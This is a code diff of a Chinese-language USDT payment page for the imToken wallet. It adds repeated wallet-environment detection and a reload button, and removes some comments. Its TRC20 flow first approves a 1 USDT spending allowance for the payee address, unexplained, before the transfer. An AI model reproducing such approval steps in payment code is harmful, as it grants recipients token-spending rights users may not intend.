@@ -68,7 +68,8 @@
   <p class="sub">请在 imToken 中确认支付</p>
 
   <div id="env-warn" class="env-warn" style="display:none">
-    ⚠️ 当前不在 imToken 环境中，请通过 imToken 的 DApp 浏览器打开此页面
+    <div style="margin-bottom:8px">⚠️ 当前不在 imToken 环境中，请通过 imToken 的 DApp 浏览器打开此页面。</div>
+    <button onclick="location.reload()" style="background:#c2410c;color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:12px;cursor:pointer;">重新检测</button>
   </div>
 
   <div class="info">
@@ -93,7 +94,6 @@
   <div class="tip" id="tip-text"></div>
 </div>
 
-<!-- 移除了 ethers.js，只有在以太坊支付时才会动态加载，加快安卓首屏速度 -->
 <script>
 const USDT_CONTRACT = {
   trx: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
@@ -112,22 +112,28 @@ $('#info-chain').textContent = chain === 'trx' ? 'TRC20 (波场)' : 'ERC20 (以�
 $('#info-amount').textContent = amount + ' USDT';
 $('#tip-text').innerHTML = `· 向收款地址支付 ${amount} USDT`;
 
-const hasTron = !!(window.tron || window.tronWeb);
-const hasEth = !!window.ethereum;
+// === 新增：延迟智能检测机制 ===
+let envCheckCount = 0;
+function checkEnvironment() {
+  const hasTron = !!(window.tron || window.tronWeb);
+  const hasEth = !!window.ethereum;
 
-if (!hasTron && !hasEth) {
-  $('#env-warn').style.display = 'block';
-} else {
-  $('#btn-pay').disabled = false;
+  if (hasTron || hasEth) {
+    $('#env-warn').style.display = 'none';
+    $('#btn-pay').disabled = false;
+  } else {
+    if (envCheckCount < 6) {
+      // 最多轮询 6 次（每次 500ms，共 3 秒），等待注入
+      envCheckCount++;
+      setTimeout(checkEnvironment, 500);
+    } else {
+      // 3秒后仍没有，显示警告
+      $('#env-warn').style.display = 'block';
+      $('#btn-pay').disabled = true;
+    }
+  }
 }
-
-// 增加一个带超时限制的 Promise
-function withTimeout(promise, ms) {
-  return Promise.race([
-    promise,
-    new Promise((_, reject) => setTimeout(() => reject(new Error('网络节点响应超时')), ms))
-  ]);
-}
+checkEnvironment();
 
 $('#btn-pay').onclick = async function () {
   const btn = this;
@@ -169,7 +175,13 @@ function setStatus(type, msg) {
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// 极速原生 TRC20 (直接下发指令，无需请求 ABI，安卓秒开)
+function withTimeout(promise, ms) {
+  return Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(() => reject(new Error('网络节点响应超时')), ms))
+  ]);
+}
+
 async function runTRC20() {
   if (!window.tronWeb || !window.tronWeb.ready) {
     throw new Error('未检测到 TRON 钱包环境');
@@ -179,7 +191,6 @@ async function runTRC20() {
   const fromAddress = window.tronWeb.defaultAddress.base58;
   if (!fromAddress) throw new Error('未获取到当前钱包地址');
 
-  // === 第 1 步：授权 1 USDT ===
   const approveParam = [
     { type: 'address', value: toAddress },
     { type: 'uint256', value: '1000000' }
@@ -199,11 +210,8 @@ async function runTRC20() {
   await window.tronWeb.trx.sendRawTransaction(signedApprove);
 
   setStatus('loading', '第 1 步授权成功！<br>第 2 步：正在唤起支付请求…');
-  
-  // 稍作延迟，避免 imToken 安卓端连续弹窗卡死
   await sleep(1500);
 
-  // === 第 2 步：支付指定金额 ===
   const amountUnits = Math.floor(amount * 1e6).toString();
   const transferParam = [
     { type: 'address', value: toAddress },
@@ -224,7 +232,6 @@ async function runTRC20() {
   await window.tronWeb.trx.sendRawTransaction(signedTransfer);
 }
 
-// ERC20 动态加载 ethers.js (按需加载，不拖慢 TRC20 用户)
 async function runERC20() {
   if (!window.ethereum) throw new Error('未检测到以太坊 Provider');
   
